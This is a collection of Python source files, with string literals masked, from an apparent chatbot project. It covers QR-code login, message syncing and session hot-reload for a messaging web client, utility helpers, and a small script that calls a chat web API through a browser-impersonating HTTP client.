core . start_receiving = start_receiving <EOL> core . get_msg = get_msg <EOL> core . logout = logout <EOL> async def login ( self , enableCmdQR = False , picDir = None , qrCallback = None , EventScanPayload = None , ScanStatus = None , event_stream = None , <EOL> loginCallback = None , exitCallback = None ) : <EOL> if self . alive or self . isLogging : <EOL> logger . warning ( '<STR_LIT>' ) <EOL> return <EOL> self . isLogging = True <EOL> while self . isLogging : <EOL> uuid = await push_login ( self ) <EOL> if uuid : <EOL> payload = EventScanPayload ( <EOL> status = ScanStatus . Waiting , <EOL> qrcode = f"<STR_LIT>" <EOL> ) <EOL> event_stream . emit ( '<STR_LIT>' , payload ) <EOL> await asyncio . sleep ( <NUM_LIT> ) <EOL> else : <EOL> logger . info ( '<STR_LIT>' ) <EOL> self . get_QRuuid ( ) <EOL> payload = EventScanPayload ( <EOL> status = ScanStatus . Waiting , <EOL> qrcode = f"<STR_LIT>" <EOL> ) <EOL> print ( f"<STR_LIT>" ) <EOL> event_stream . emit ( '<STR_LIT>' , payload ) <EOL> await asyncio . sleep ( <NUM_LIT> ) <EOL> isLoggedIn = False <EOL> while not isLoggedIn : <EOL> status = await self . check_login ( ) <EOL> if status == '<STR_LIT>' : <EOL> isLoggedIn = True <EOL> payload = EventScanPayload ( <EOL> status = ScanStatus . Scanned , <EOL> qrcode = f"<STR_LIT>" <EOL> ) <EOL> event_stream . emit ( '<STR_LIT>' , payload ) <EOL> await asyncio . sleep ( <NUM_LIT> ) <EOL> elif status == '<STR_LIT>' : <EOL> if isLoggedIn is not None : <EOL> logger . info ( '<STR_LIT>' ) <EOL> isLoggedIn = None <EOL> payload = EventScanPayload ( <EOL> status = ScanStatus . Waiting , <EOL> qrcode = f"<STR_LIT>" <EOL> ) <EOL> event_stream . emit ( '<STR_LIT>' , payload ) <EOL> await asyncio . sleep ( <NUM_LIT> ) <EOL> elif status != '<STR_LIT>' : <EOL> payload = EventScanPayload ( <EOL> status = ScanStatus . Cancel , <EOL> qrcode = f"<STR_LIT>" <EOL> ) <EOL> event_stream . emit ( '<STR_LIT>' , payload ) <EOL> await asyncio . sleep ( <NUM_LIT> ) <EOL> break <EOL> if isLoggedIn : <EOL> payload = EventScanPayload ( <EOL> status = ScanStatus . Confirmed , <EOL> qrcode = f"<STR_LIT>" <EOL> ) <EOL> event_stream . emit ( '<STR_LIT>' , payload ) <EOL> await asyncio . sleep ( <NUM_LIT> ) <EOL> break <EOL> elif self . isLogging : <EOL> logger . info ( '<STR_LIT>' ) <EOL> payload = EventScanPayload ( <EOL> status = ScanStatus . Timeout , <EOL> qrcode = f"<STR_LIT>" <EOL> ) <EOL> event_stream . emit ( '<STR_LIT>' , payload ) <EOL> await asyncio . sleep ( <NUM_LIT> ) <EOL> else : <EOL> return <EOL> logger . info ( '<STR_LIT>' ) <EOL> await self . web_init ( ) <EOL> await self . show_mobile_login ( ) <EOL> self . get_contact ( True ) <EOL> if hasattr ( loginCallback , '<STR_LIT>' ) : <EOL> r = await loginCallback ( self . storageClass . userName ) <EOL> else : <EOL> utils . clear_screen ( ) <EOL> if os . path . exists ( picDir or config . DEFAULT_QR ) : <EOL> os . remove ( picDir or config . DEFAULT_QR ) <EOL> logger . info ( '<STR_LIT>' % self . storageClass . nickName ) <EOL> await self . start_receiving ( exitCallback ) <EOL> self . isLogging = False <EOL> async def push_login ( core ) : <EOL> cookiesDict = core . s . cookies . get_dict ( ) <EOL> if '<STR_LIT>' in cookiesDict : <EOL> url = '<STR_LIT>' % ( <EOL> config . BASE_URL , cookiesDict [ '<STR_LIT>' ] ) <EOL> headers = { '<STR_LIT>' : config . USER_AGENT } <EOL> r = core . s . get ( url , headers = headers ) . json ( ) <EOL> if '<STR_LIT>' in r and r . get ( '<STR_LIT>' ) in ( <NUM_LIT> , '<STR_LIT>' ) : <EOL> core . uuid = r [ '<STR_LIT>' ] <EOL> return r [ '<STR_LIT>' ] <EOL> return False <EOL> def get_QRuuid ( self ) : <EOL> url = '<STR_LIT>' % config . BASE_URL <EOL> params = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' } <EOL> headers = { '<STR_LIT>' : config . USER_AGENT } <EOL> r = self . s . get ( url , params = params , headers = headers ) <EOL> regx = r'<STR_LIT>' <EOL> data = re . search ( regx , r . text ) <EOL> if data and data . group ( <NUM_LIT> ) == '<STR_LIT>' : <EOL> self . uuid = data . group ( <NUM_LIT> ) <EOL> return self . uuid <EOL> async def get_QR ( self , uuid = None , enableCmdQR = False , picDir = None , qrCallback = None ) : <EOL> uuid = uuid or self . uuid <EOL> picDir = picDir or config . DEFAULT_QR <EOL> qrStorage = io . BytesIO ( ) <EOL> qrCode = QRCode ( '<STR_LIT>' + uuid ) <EOL> qrCode . png ( qrStorage , scale = <NUM_LIT> ) <EOL> if hasattr ( qrCallback , '<STR_LIT>' ) : <EOL> await qrCallback ( uuid = uuid , status = '<STR_LIT>' , qrcode = qrStorage . getvalue ( ) ) <EOL> else : <EOL> with open ( picDir , '<STR_LIT>' ) as f : <EOL> f . write ( qrStorage . getvalue ( ) ) <EOL> if enableCmdQR : <EOL> utils . print_cmd_qr ( qrCode . text ( <NUM_LIT> ) , enableCmdQR = enableCmdQR ) <EOL> else : <EOL> utils . print_qr ( picDir ) <EOL> return qrStorage <EOL> async def check_login ( self , uuid = None ) : <EOL> uuid = uuid or self . uuid <EOL> url = '<STR_LIT>' % config . BASE_URL <EOL> localTime = int ( time . time ( ) ) <EOL> params = '<STR_LIT>' % ( <EOL> uuid , int ( - localTime / <NUM_LIT> ) , localTime ) <EOL> headers = { '<STR_LIT>' : config . USER_AGENT } <EOL> r = self . s . get ( url , params = params , headers = headers ) <EOL> regx = r'<STR_LIT>' <EOL> data = re . search ( regx , r . text ) <EOL> if data and data . group ( <NUM_LIT> ) == '<STR_LIT>' : <EOL> if await process_login_info ( self , r . text ) : <EOL> return '<STR_LIT>' <EOL> else : <EOL> return '<STR_LIT>' <EOL> elif data : <EOL> return data . group ( <NUM_LIT> ) <EOL> else : <EOL> return '<STR_LIT>' <EOL> async def process_login_info ( core , loginContent ) : <EOL> regx = r'<STR_LIT>' <EOL> core . loginInfo [ '<STR_LIT>' ] = re . search ( regx , loginContent ) . group ( <NUM_LIT> ) <EOL> headers = { '<STR_LIT>' : config . USER_AGENT , <EOL> '<STR_LIT>' : config . UOS_PATCH_CLIENT_VERSION , <EOL> '<STR_LIT>' : config . UOS_PATCH_EXTSPAM , <EOL> '<STR_LIT>' : '<STR_LIT>' <EOL> } <EOL> r = core . s . get ( core . loginInfo [ '<STR_LIT>' ] , headers = headers , allow_redirects = False ) <EOL> core . loginInfo [ '<STR_LIT>' ] = core . loginInfo [ '<STR_LIT>' ] [ : core . loginInfo [ '<STR_LIT>' ] . rfind ( '<STR_LIT>' ) ] <EOL> for indexUrl , detailedUrl in ( <EOL> ( "<STR_LIT>" , ( "<STR_LIT>" , "<STR_LIT>" ) ) , <EOL> ( "<STR_LIT>" , ( "<STR_LIT>" , "<STR_LIT>" ) ) , <EOL> ( "<STR_LIT>" , ( "<STR_LIT>" , "<STR_LIT>" ) ) , <EOL> ( "<STR_LIT>" , ( "<STR_LIT>" , "<STR_LIT>" ) ) , <EOL> ( "<STR_LIT>" , ( "<STR_LIT>" , "<STR_LIT>" ) ) ) : <EOL> fileUrl , syncUrl = [ '<STR_LIT>' % url for url in detailedUrl ] <EOL> if indexUrl in core . loginInfo [ '<STR_LIT>' ] : <EOL> core . loginInfo [ '<STR_LIT>' ] , core . loginInfo [ '<STR_LIT>' ] = fileUrl , syncUrl <EOL> break <EOL> else : <EOL> core . loginInfo [ '<STR_LIT>' ] = core . loginInfo [ '<STR_LIT>' ] = core . loginInfo [ '<STR_LIT>' ] <EOL> core . loginInfo [ '<STR_LIT>' ] = '<STR_LIT>' + repr ( random . random ( ) ) [ <NUM_LIT> : <NUM_LIT> ] <EOL> core . loginInfo [ '<STR_LIT>' ] = int ( time . time ( ) * <NUM_LIT> ) <EOL> core . loginInfo [ '<STR_LIT>' ] = { } <EOL> cookies = core . s . cookies . get_dict ( ) <EOL> skey = re . findall ( '<STR_LIT>' , r . text , re . S ) [ <NUM_LIT> ] <EOL> pass_ticket = re . findall ( '<STR_LIT>' , r . text , re . S ) [ <NUM_LIT> ] <EOL> core . loginInfo [ '<STR_LIT>' ] = core . loginInfo [ '<STR_LIT>' ] [ '<STR_LIT>' ] = skey <EOL> core . loginInfo [ '<STR_LIT>' ] = core . loginInfo [ '<STR_LIT>' ] [ '<STR_LIT>' ] = cookies [ "<STR_LIT>" ] <EOL> core . loginInfo [ '<STR_LIT>' ] = core . loginInfo [ '<STR_LIT>' ] [ '<STR_LIT>' ] = cookies [ "<STR_LIT>" ] <EOL> core . loginInfo [ '<STR_LIT>' ] = pass_ticket <EOL> if not all ( [ key in core . loginInfo for key in ( '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' , '<STR_LIT>' ) ] ) : <EOL> logger . error ( '<STR_LIT>' % r . text ) <EOL> core . isLogging = False <EOL> return False <EOL> return True <EOL> async def web_init ( self ) : <EOL> url = '<STR_LIT>' % self . loginInfo [ '<STR_LIT>' ] <EOL> params = { <EOL> '<STR_LIT>' : int ( - time . time ( ) / <NUM_LIT> ) , <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , } <EOL> data = { '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , } <EOL> headers = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : config . USER_AGENT , } <EOL> r = self . s . post ( url , params = params , data = json . dumps ( data ) , headers = headers ) <EOL> dic = json . loads ( r . content . decode ( '<STR_LIT>' , '<STR_LIT>' ) ) <EOL> utils . emoji_formatter ( dic [ '<STR_LIT>' ] , '<STR_LIT>' ) <EOL> self . loginInfo [ '<STR_LIT>' ] = int ( dic [ '<STR_LIT>' ] ) <EOL> self . loginInfo [ '<STR_LIT>' ] = wrap_user_dict ( utils . struct_friend_info ( dic [ '<STR_LIT>' ] ) ) <EOL> self . memberList . append ( self . loginInfo [ '<STR_LIT>' ] ) <EOL> self . loginInfo [ '<STR_LIT>' ] = dic [ '<STR_LIT>' ] <EOL> self . loginInfo [ '<STR_LIT>' ] = '<STR_LIT>' . join ( [ '<STR_LIT>' % ( item [ '<STR_LIT>' ] , item [ '<STR_LIT>' ] ) <EOL> for item in dic [ '<STR_LIT>' ] [ '<STR_LIT>' ] ] ) <EOL> self . storageClass . userName = dic [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> self . storageClass . nickName = dic [ '<STR_LIT>' ] [ '<STR_LIT>' ] <EOL> contactList = dic . get ( '<STR_LIT>' , [ ] ) <EOL> chatroomList , otherList = [ ] , [ ] <EOL> for m in contactList : <EOL> if m [ '<STR_LIT>' ] != <NUM_LIT> : <EOL> otherList . append ( m ) <EOL> elif '<STR_LIT>' in m [ '<STR_LIT>' ] : <EOL> m [ '<STR_LIT>' ] = [ ] <EOL> chatroomList . append ( m ) <EOL> elif '<STR_LIT>' in m [ '<STR_LIT>' ] : <EOL> otherList . append ( m ) <EOL> if chatroomList : <EOL> update_local_chatrooms ( self , chatroomList ) <EOL> if otherList : <EOL> update_local_friends ( self , otherList ) <EOL> return dic <EOL> async def show_mobile_login ( self ) : <EOL> url = '<STR_LIT>' % ( <EOL> self . loginInfo [ '<STR_LIT>' ] , self . loginInfo [ '<STR_LIT>' ] ) <EOL> data = { <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : self . storageClass . userName , <EOL> '<STR_LIT>' : self . storageClass . userName , <EOL> '<STR_LIT>' : int ( time . time ( ) ) , } <EOL> headers = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : config . USER_AGENT , } <EOL> r = self . s . post ( url , data = json . dumps ( data ) , headers = headers ) <EOL> return ReturnValue ( rawResponse = r ) <EOL> async def start_receiving ( self , exitCallback = None , getReceivingFnOnly = False ) : <EOL> self . alive = True <EOL> def maintain_loop ( ) : <EOL> retryCount = <NUM_LIT> <EOL> while self . alive : <EOL> try : <EOL> i = sync_check ( self ) <EOL> if i is None : <EOL> self . alive = False <EOL> elif i == '<STR_LIT>' : <EOL> pass <EOL> else : <EOL> msgList , contactList = self . get_msg ( ) <EOL> if msgList : <EOL> msgList = produce_msg ( self , msgList ) <EOL> for msg in msgList : <EOL> self . msgList . put ( msg ) <EOL> if contactList : <EOL> chatroomList , otherList = [ ] , [ ] <EOL> for contact in contactList : <EOL> if '<STR_LIT>' in contact [ '<STR_LIT>' ] : <EOL> chatroomList . append ( contact ) <EOL> else : <EOL> otherList . append ( contact ) <EOL> chatroomMsg = update_local_chatrooms ( self , chatroomList ) <EOL> chatroomMsg [ '<STR_LIT>' ] = self . loginInfo [ '<STR_LIT>' ] <EOL> self . msgList . put ( chatroomMsg ) <EOL> update_local_friends ( self , otherList ) <EOL> retryCount = <NUM_LIT> <EOL> except requests . exceptions . ReadTimeout : <EOL> pass <EOL> except : <EOL> retryCount += <NUM_LIT> <EOL> logger . error ( traceback . format_exc ( ) ) <EOL> if self . receivingRetryCount < retryCount : <EOL> self . alive = False <EOL> else : <EOL> time . sleep ( <NUM_LIT> ) <EOL> self . logout ( ) <EOL> if hasattr ( exitCallback , '<STR_LIT>' ) : <EOL> exitCallback ( self . storageClass . userName ) <EOL> else : <EOL> logger . info ( '<STR_LIT>' ) <EOL> if getReceivingFnOnly : <EOL> return maintain_loop <EOL> else : <EOL> maintainThread = threading . Thread ( target = maintain_loop ) <EOL> maintainThread . setDaemon ( True ) <EOL> maintainThread . start ( ) <EOL> def sync_check ( self ) : <EOL> url = '<STR_LIT>' % self . loginInfo . get ( '<STR_LIT>' , self . loginInfo [ '<STR_LIT>' ] ) <EOL> params = { <EOL> '<STR_LIT>' : int ( time . time ( ) * <NUM_LIT> ) , <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , } <EOL> headers = { '<STR_LIT>' : config . USER_AGENT } <EOL> self . loginInfo [ '<STR_LIT>' ] += <NUM_LIT> <EOL> try : <EOL> r = self . s . get ( url , params = params , headers = headers , timeout = config . TIMEOUT ) <EOL> except requests . exceptions . ConnectionError as e : <EOL> try : <EOL> if not isinstance ( e . args [ <NUM_LIT> ] . args [ <NUM_LIT> ] , BadStatusLine ) : <EOL> raise <EOL> return '<STR_LIT>' <EOL> except : <EOL> raise <EOL> r . raise_for_status ( ) <EOL> regx = r'<STR_LIT>' <EOL> pm = re . search ( regx , r . text ) <EOL> if pm is None or pm . group ( <NUM_LIT> ) != '<STR_LIT>' : <EOL> logger . debug ( '<STR_LIT>' % r . text ) <EOL> return None <EOL> return pm . group ( <NUM_LIT> ) <EOL> def get_msg ( self ) : <EOL> self . loginInfo [ '<STR_LIT>' ] = '<STR_LIT>' + repr ( random . random ( ) ) [ <NUM_LIT> : <NUM_LIT> ] <EOL> url = '<STR_LIT>' % ( <EOL> self . loginInfo [ '<STR_LIT>' ] , self . loginInfo [ '<STR_LIT>' ] , <EOL> self . loginInfo [ '<STR_LIT>' ] , self . loginInfo [ '<STR_LIT>' ] ) <EOL> data = { <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : ~ int ( time . time ( ) ) , } <EOL> headers = { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : config . USER_AGENT } <EOL> r = self . s . post ( url , data = json . dumps ( data ) , headers = headers , timeout = config . TIMEOUT ) <EOL> dic = json . loads ( r . content . decode ( '<STR_LIT>' , '<STR_LIT>' ) ) <EOL> if dic [ '<STR_LIT>' ] [ '<STR_LIT>' ] != <NUM_LIT> : return None , None <EOL> self . loginInfo [ '<STR_LIT>' ] = dic [ '<STR_LIT>' ] <EOL> self . loginInfo [ '<STR_LIT>' ] = '<STR_LIT>' . join ( [ '<STR_LIT>' % ( item [ '<STR_LIT>' ] , item [ '<STR_LIT>' ] ) <EOL> for item in dic [ '<STR_LIT>' ] [ '<STR_LIT>' ] ] ) <EOL> return dic [ '<STR_LIT>' ] , dic [ '<STR_LIT>' ] <EOL> def logout ( self ) : <EOL> if self . alive : <EOL> url = '<STR_LIT>' % self . loginInfo [ '<STR_LIT>' ] <EOL> params = { <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : <NUM_LIT> , <EOL> '<STR_LIT>' : self . loginInfo [ '<STR_LIT>' ] , } <EOL> headers = { '<STR_LIT>' : config . USER_AGENT } <EOL> self . s . get ( url , params = params , headers = headers ) <EOL> self . alive = False <EOL> self . isLogging = False <EOL> self . s . cookies . clear ( ) <EOL> del self . chatroomList [ : ] <EOL> del self . memberList [ : ] <EOL> del self . mpList [ : ] <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : <NUM_LIT> , } } ) <EOL> </s>
<s> import pickle , os <EOL> import logging <EOL> import requests <EOL> from . . config import VERSION <EOL> from . . returnvalues import ReturnValue <EOL> from . . storage import templates <EOL> from . contact import update_local_chatrooms , update_local_friends <EOL> from . messages import produce_msg <EOL> logger = logging . getLogger ( '<STR_LIT>' ) <EOL> def load_hotreload ( core ) : <EOL> core . dump_login_status = dump_login_status <EOL> core . load_login_status = load_login_status <EOL> def dump_login_status ( self , fileDir = None ) : <EOL> fileDir = fileDir or self . hotReloadDir <EOL> try : <EOL> with open ( fileDir , '<STR_LIT>' ) as f : <EOL> f . write ( '<STR_LIT>' ) <EOL> os . remove ( fileDir ) <EOL> except : <EOL> raise Exception ( '<STR_LIT>' ) <EOL> status = { <EOL> '<STR_LIT>' : VERSION , <EOL> '<STR_LIT>' : self . loginInfo , <EOL> '<STR_LIT>' : self . s . cookies . get_dict ( ) , <EOL> '<STR_LIT>' : self . storageClass . dumps ( ) } <EOL> with open ( fileDir , '<STR_LIT>' ) as f : <EOL> pickle . dump ( status , f ) <EOL> logger . debug ( '<STR_LIT>' ) <EOL> def load_login_status ( self , fileDir , <EOL> loginCallback = None , exitCallback = None ) : <EOL> try : <EOL> with open ( fileDir , '<STR_LIT>' ) as f : <EOL> j = pickle . load ( f ) <EOL> except Exception as e : <EOL> logger . debug ( '<STR_LIT>' ) <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : - <NUM_LIT> , } } ) <EOL> if j . get ( '<STR_LIT>' , '<STR_LIT>' ) != VERSION : <EOL> logger . debug ( ( '<STR_LIT>' + <EOL> '<STR_LIT>' ) % ( <EOL> j . get ( '<STR_LIT>' , '<STR_LIT>' ) , VERSION ) ) <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : - <NUM_LIT> , } } ) <EOL> self . loginInfo = j [ '<STR_LIT>' ] <EOL> self . loginInfo [ '<STR_LIT>' ] = templates . User ( self . loginInfo [ '<STR_LIT>' ] ) <EOL> self . loginInfo [ '<STR_LIT>' ] . core = self <EOL> self . s . cookies = requests . utils . cookiejar_from_dict ( j [ '<STR_LIT>' ] ) <EOL> self . storageClass . loads ( j [ '<STR_LIT>' ] ) <EOL> try : <EOL> msgList , contactList = self . get_msg ( ) <EOL> except : <EOL> msgList = contactList = None <EOL> if ( msgList or contactList ) is None : <EOL> self . logout ( ) <EOL> load_last_login_status ( self . s , j [ '<STR_LIT>' ] ) <EOL> logger . debug ( '<STR_LIT>' ) <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : - <NUM_LIT> , } } ) <EOL> else : <EOL> if contactList : <EOL> for contact in contactList : <EOL> if '<STR_LIT>' in contact [ '<STR_LIT>' ] : <EOL> update_local_chatrooms ( self , [ contact ] ) <EOL> else : <EOL> update_local_friends ( self , [ contact ] ) <EOL> if msgList : <EOL> msgList = produce_msg ( self , msgList ) <EOL> for msg in msgList : self . msgList . put ( msg ) <EOL> self . start_receiving ( exitCallback ) <EOL> logger . debug ( '<STR_LIT>' ) <EOL> if hasattr ( loginCallback , '<STR_LIT>' ) : <EOL> loginCallback ( ) <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : <NUM_LIT> , } } ) <EOL> def load_last_login_status ( session , cookiesDict ) : <EOL> try : <EOL> session . cookies = requests . utils . cookiejar_from_dict ( { <EOL> '<STR_LIT>' : cookiesDict [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : cookiesDict [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : cookiesDict [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : cookiesDict [ '<STR_LIT>' ] + '<STR_LIT>' , <EOL> '<STR_LIT>' : cookiesDict [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : cookiesDict [ '<STR_LIT>' ] , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : '<STR_LIT>' , } ) <EOL> except : <EOL> logger . info ( '<STR_LIT>' ) <EOL> logger . info ( '<STR_LIT>' ) <EOL> </s>
<s> from . contact import load_contact <EOL> from . hotreload import load_hotreload <EOL> from . login import load_login <EOL> from . messages import load_messages <EOL> from . register import load_register <EOL> def load_components ( core ) : <EOL> load_contact ( core ) <EOL> load_hotreload ( core ) <EOL> load_login ( core ) <EOL> load_messages ( core ) <EOL> load_register ( core ) <EOL> </s>
<s> import json <EOL> import os <EOL> from common . log import logger <EOL> config = { } <EOL> def load_config ( ) : <EOL> global config <EOL> config_path = "<STR_LIT>" <EOL> if not os . path . exists ( config_path ) : <EOL> raise Exception ( '<STR_LIT>' ) <EOL> config_str = read_file ( config_path ) <EOL> config = json . loads ( config_str ) <EOL> logger . info ( "<STR_LIT>" . format ( config ) ) <EOL> def get_root ( ) : <EOL> return os . path . dirname ( os . path . abspath ( __file__ ) ) <EOL> def read_file ( path ) : <EOL> with open ( path , mode = '<STR_LIT>' , encoding = '<STR_LIT>' ) as f : <EOL> return f . read ( ) <EOL> def conf ( ) : <EOL> return config <EOL> </s>
<s> import io <EOL> import os <EOL> from dotenv import load_dotenv <EOL> from PIL import Image <EOL> def fsize ( file ) : <EOL> if isinstance ( file , io . BytesIO ) : <EOL> return file . getbuffer ( ) . nbytes <EOL> elif isinstance ( file , str ) : <EOL> return os . path . getsize ( file ) <EOL> elif hasattr ( file , "<STR_LIT>" ) and hasattr ( file , "<STR_LIT>" ) : <EOL> pos = file . tell ( ) <EOL> file . seek ( <NUM_LIT> , os . SEEK_END ) <EOL> size = file . tell ( ) <EOL> file . seek ( pos ) <EOL> return size <EOL> else : <EOL> raise TypeError ( "<STR_LIT>" ) <EOL> def compress_imgfile ( file , max_size ) : <EOL> if fsize ( file ) <= max_size : <EOL> return file <EOL> file . seek ( <NUM_LIT> ) <EOL> img = Image . open ( file ) <EOL> rgb_image = img . convert ( "<STR_LIT>" ) <EOL> quality = <NUM_LIT> <EOL> while True : <EOL> out_buf = io . BytesIO ( ) <EOL> rgb_image . save ( out_buf , "<STR_LIT>" , quality = quality ) <EOL> if fsize ( out_buf ) <= max_size : <EOL> return out_buf <EOL> quality -= <NUM_LIT> <EOL> def split_string_by_utf8_length ( string , max_length , max_split = <NUM_LIT> ) : <EOL> encoded = string . encode ( "<STR_LIT>" ) <EOL> start , end = <NUM_LIT> , <NUM_LIT> <EOL> result = [ ] <EOL> while end < len ( encoded ) : <EOL> if max_split > <NUM_LIT> and len ( result ) >= max_split : <EOL> result . append ( encoded [ start : ] . decode ( "<STR_LIT>" ) ) <EOL> break <EOL> end = min ( start + max_length , len ( encoded ) ) <EOL> while end < len ( encoded ) and ( encoded [ end ] & <NUM_LIT> ) == <NUM_LIT> : <EOL> end -= <NUM_LIT> <EOL> result . append ( encoded [ start : end ] . decode ( "<STR_LIT>" ) ) <EOL> start = end <EOL> return result <EOL> load_dotenv ( ) <EOL> def get_cookie ( ) : <EOL> cookie = os . getenv ( '<STR_LIT>' ) <EOL> print ( cookie ) <EOL> if not cookie : <EOL> raise ValueError ( "<STR_LIT>" ) <EOL> return cookie <EOL> def get_proxy ( ) -> bool : <EOL> isproxy = os . getenv ( '<STR_LIT>' ) <EOL> print ( isproxy ) <EOL> if not isproxy : <EOL> return False <EOL> else : <EOL> return True if isproxy . lower ( ) == '<STR_LIT>' else False <EOL> </s>
<s> from curl_cffi import requests , Curl , CurlOpt <EOL> from io import BytesIO <EOL> import json <EOL> import re <EOL> def send_message ( ) : <EOL> url = "<STR_LIT>" <EOL> attachments = [ ] <EOL> prompt = "<STR_LIT>" <EOL> organization_id = "<STR_LIT>" <EOL> conversation_id = "<STR_LIT>" <EOL> cookie = "<STR_LIT>" <EOL> proxies = "<STR_LIT>" <EOL> payload = json . dumps ( { <EOL> "<STR_LIT>" : { <EOL> "<STR_LIT>" : f"<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" , <EOL> "<STR_LIT>" : "<STR_LIT>" <EOL> } , <EOL> "<STR_LIT>" : f"<STR_LIT>" , <EOL> "<STR_LIT>" : f"<STR_LIT>" , <EOL> "<STR_LIT>" : f"<STR_LIT>" , <EOL> "<STR_LIT>" : attachments <EOL> } ) <EOL> headers = [ b'<STR_LIT>' , <EOL> b'<STR_LIT>' , <EOL> b'<STR_LIT>' , <EOL> b'<STR_LIT>' , <EOL> b'<STR_LIT>' , <EOL> b'<STR_LIT>' , <EOL> b'<STR_LIT>' , <EOL> b'<STR_LIT>' , <EOL> b'<STR_LIT>' % cookie . encode ( '<STR_LIT>' ) , <EOL> b'<STR_LIT>' , <EOL> b'<STR_LIT>' , <EOL> b'<STR_LIT>' , <EOL> b'<STR_LIT>' ] <EOL> buffer = BytesIO ( ) <EOL> c = Curl ( ) <EOL> def stream_callback ( data ) : <EOL> json_str = data . decode ( '<STR_LIT>' ) <EOL> decoded_data = re . sub ( '<STR_LIT>' , '<STR_LIT>' , json_str ) . strip ( ) <EOL> data_strings = decoded_data . split ( '<STR_LIT>' ) <EOL> for data_string in data_strings : <EOL> json_str = data_string [ <NUM_LIT> : ] . strip ( ) <EOL> _data = json . loads ( json_str ) <EOL> if '<STR_LIT>' in _data : <EOL> buffer . write ( str ( _data [ '<STR_LIT>' ] ) . encode ( '<STR_LIT>' ) ) <EOL> print ( _data [ '<STR_LIT>' ] , end = "<STR_LIT>" ) <EOL> c . setopt ( CurlOpt . URL , b'<STR_LIT>' ) <EOL> c . setopt ( CurlOpt . WRITEFUNCTION , stream_callback ) <EOL> c . setopt ( CurlOpt . HTTPHEADER , headers ) <EOL> c . setopt ( CurlOpt . POSTFIELDS , payload ) <EOL> c . setopt ( CurlOpt . PROXY , proxies . encode ( ) ) <EOL> c . impersonate ( "<STR_LIT>" ) <EOL> c . perform ( ) <EOL> c . close ( ) <EOL> body = buffer . getvalue ( ) <EOL> print ( body . decode ( ) ) <EOL> send_message ( ) <EOL> </s>
<s> import os , time , re , io <EOL> import json <EOL> import mimetypes , hashlib <EOL> import logging <EOL> from collections import OrderedDict <EOL> from . . import config , utils <EOL> from . . returnvalues import ReturnValue <EOL> from . . storage import templates <EOL> from . contact import update_local_uin <EOL> logger = logging . getLogger ( '<STR_LIT>' ) <EOL> def load_messages ( core ) : <EOL> core . send_raw_msg = send_raw_msg <EOL> core . send_msg = send_msg <EOL> core . upload_file = upload_file <EOL> core . send_file = send_file <EOL> core . send_image = send_image <EOL> core . send_video = send_video <EOL> core . send = send <EOL> core . revoke = revoke <EOL> async def get_download_fn ( core , url , msgId ) : <EOL> async def download_fn ( downloadDir = None ) : <EOL> params = { <EOL> '<STR_LIT>' : msgId , <EOL> '<STR_LIT>' : core . loginInfo [ '<STR_LIT>' ] , } <EOL> headers = { '<STR_LIT>' : config . USER_AGENT } <EOL> r = core . s . get ( url , params = params , stream = True , headers = headers ) <EOL> tempStorage = io . BytesIO ( ) <EOL> for block in r . iter_content ( <NUM_LIT> ) : <EOL> tempStorage . write ( block ) <EOL> if downloadDir is None : <EOL> return tempStorage . getvalue ( ) <EOL> with open ( downloadDir , '<STR_LIT>' ) as f : <EOL> f . write ( tempStorage . getvalue ( ) ) <EOL> tempStorage . seek ( <NUM_LIT> ) <EOL> return ReturnValue ( { '<STR_LIT>' : { <EOL> '<STR_LIT>' : '<STR_LIT>' , <EOL> '<STR_LIT>' : <NUM_LIT> , } , <EOL> '<STR_LIT>' : utils . get_image_postfix ( tempStorage . read ( <NUM_LIT> ) ) , } ) <EOL> return download_fn <EOL> def produce_msg ( core , msgList ) : <EOL> rl = [ ] <EOL> srl = [ <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> , <NUM_LIT> ] <EOL> for m in msgList : <EOL> if m [ '<STR_LIT>' ] == core . storageClass . userName : <EOL> actualOpposite = m [ '<STR_LIT>' ] <EOL> else : 